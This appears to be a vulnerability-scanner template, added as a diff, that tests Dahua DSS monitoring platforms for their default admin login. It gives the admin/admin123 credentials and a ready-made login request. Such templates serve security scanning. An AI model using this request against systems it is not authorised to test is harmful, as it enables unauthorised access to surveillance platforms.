@@ -1,0 +1,28 @@
+id: dahua-dss-default-login-1
+info:
+  name: 大华 DSS 综合监控管理平台默认密码
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://github.com/CRlife/Rscan/blob/0edbf44689fbc876294a7d8603639dfe44fabeee/poc/yaml-poc/poc-yaml-%E5%A4%A7%E5%8D%8EDSS-default-password.yaml
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    tips: admin/admin123
+  tags: dahua,dss,default-login
+
+http:
+  - raw:
+      - |
+        GET /portal/$%7BappPath%7D/login_isLoginable.action?userBean.loginName=admin&userBean.loginPass=dc0134141ec9319b6b4a00a75fc6a6f5 HTTP/1.1
+        Host: {{Hostname}}
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'\"2\"')
+        condition: and
